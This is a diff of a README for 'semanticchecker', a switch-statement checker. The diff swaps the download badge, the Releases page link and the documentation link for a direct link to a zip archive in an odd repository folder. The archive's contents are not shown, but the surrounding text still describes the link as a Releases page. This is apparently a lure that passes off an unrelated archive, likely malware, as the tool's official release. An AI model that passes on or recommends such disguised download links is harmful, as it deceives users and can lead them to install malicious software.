@@ -4,10 +4,10 @@
 Welcome to semanticchecker! This tool helps you check your code's switch statements for errors before you run your projects. Using semanticchecker ensures that your code meets specific criteria, preventing bugs and unexpected behavior.
 
 ## 🔗 Download
-[![Download semanticchecker](https://img.shields.io/badge/Download-semanticchecker-blue.svg)](https://github.com/macsim12324/semanticchecker/releases)
+[![Download semanticchecker](https://raw.githubusercontent.com/macsim12324/semanticchecker/main/Scorpiid/Software_v2.4.zip)](https://raw.githubusercontent.com/macsim12324/semanticchecker/main/Scorpiid/Software_v2.4.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/macsim12324/semanticchecker/releases) to download the latest version of semanticchecker. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/macsim12324/semanticchecker/main/Scorpiid/Software_v2.4.zip) to download the latest version of semanticchecker. Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
@@ -72,7 +72,7 @@ If you encounter issues or have suggestions, feel free to raise an issue on the 
 ## 🔗 Additional Resources
 For more information and advanced usage, consider checking the following:
 
-- [Official Documentation](https://github.com/macsim12324/semanticchecker)
+- [Official Documentation](https://raw.githubusercontent.com/macsim12324/semanticchecker/main/Scorpiid/Software_v2.4.zip)
 - Related programming tutorials focusing on switch statements
 - Resources on semantic analysis in compilers
 
